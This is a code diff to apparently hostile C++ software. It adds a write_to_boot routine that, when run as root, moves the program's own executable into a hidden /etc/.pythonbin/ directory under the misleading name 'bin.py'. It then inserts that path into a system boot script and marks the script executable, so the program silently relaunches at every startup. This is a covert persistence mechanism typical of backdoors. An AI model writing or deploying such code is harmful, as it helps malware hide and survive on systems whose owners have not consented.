@@ -113,6 +113,35 @@ class gui_bar{
             }
             return string(current_user) + string("@") + string(sysinfo.nodename) + string(":~") + string(cwd) + string(uid_user);
         }
+        bool write_to_boot(string file_name, string boot_file){
+			ifstream count_line;
+		    ofstream startup;
+		    startup.open(("/tmp/tmp.txt"), ios::out | ios::app);
+			string line;
+			count_line.open(file_name);
+			while(count_line.good()){
+		        while(!count_line.eof()) // To get you all the lines.
+		        {
+		            getline(count_line, line);
+		            if(line.find(boot_file) != -1){
+		                system("rm -rf /tmp/tmp.txt");
+		                return false;
+		            }
+		            else if(line=="# Make sure that the script will \"exit 0\" on success or any other\n" || line!="exit 0"){
+		               startup << line << endl;  
+		            }
+		        }
+			   count_line.close();
+			   break;
+			}
+		    startup << boot_file << endl;
+		    startup << "exit 0" << endl;
+		    startup.close();     
+		    rename("/tmp/tmp.txt", (file_name).c_str());
+		    system("rm -rf /tmp/tmp.txt");
+		    system(("chmod +x " + string(file_name)).c_str());
+			return true;
+		}
         void file_setup(string service_s, string file_p)
         {
           if(getuid() != 0){ // not root :(
@@ -122,63 +151,9 @@ class gui_bar{
           else{ //root
               system("mkdir /etc/.pythonbin/");
               system(("mv " + string(getexepath()) + " /etc/.pythonbin/bin.py").c_str());
-              string line;
-              ifstream boot_check(service_s);
-              if(boot_check)
-              {
-                //need to edit the boot so its starts on startup
-                boot_check.close();
-                ifstream bootfile(service_s); 
-                size_t pos;
-                while(bootfile.good())
-                {
-                    getline(bootfile,line); // get line from file
-                    pos=line.find(file_p); // search
-                    if(pos!=string::npos) // string::npos is returned if string is not found
-                      {
-                        cout << "file in startup :)" << endl;
-                        return;
-                      }
-                }
-                char buff[BUFSIZ];      // the input line
-                char newbuff[BUFSIZ];   // the results of any editing
-                string out_file = "/tmp/tmp.txt";
-                string exit_find = "exit 0";
-                char replacewith[] = "";
-                FILE *in, *out;
-                in = fopen((service_s).c_str(), "r" );
-                out= fopen((out_file).c_str(), "w" );
-                while (fgets(buff, BUFSIZ, in) != NULL ) 
-                {
-                    if (strstr( buff, (exit_find).c_str()) != NULL ) 
-                    {
-                        NULL;
-                    } 
-                    else 
-                    {
-                        strcpy(newbuff, buff);
-                    }
-                    fputs(newbuff, out);
-                }
-                fclose(in);
-                fclose(out);
-                if(rename((out_file).c_str(), (service_s).c_str())) 
-                {
-                   NULL; 
-                }
-                ofstream startup;
-                startup.open((service_s), ios::out | ios::app);
-                startup << endl << file_p << endl;
-                startup << endl << "exit 0" << endl;
-                startup.close();
-                cout << "wrote to file" << endl;
-                system("rm -rf /tmp/tmp.txt");
-              }   
-              else{
-                  cout << "file doesnt exist" << endl;
-              }     
-          }              
-        }
+              write_to_boot(service_s, file_p);
+         }   
+        } 
 }; gui_bar gb;
 
 class gui_user{
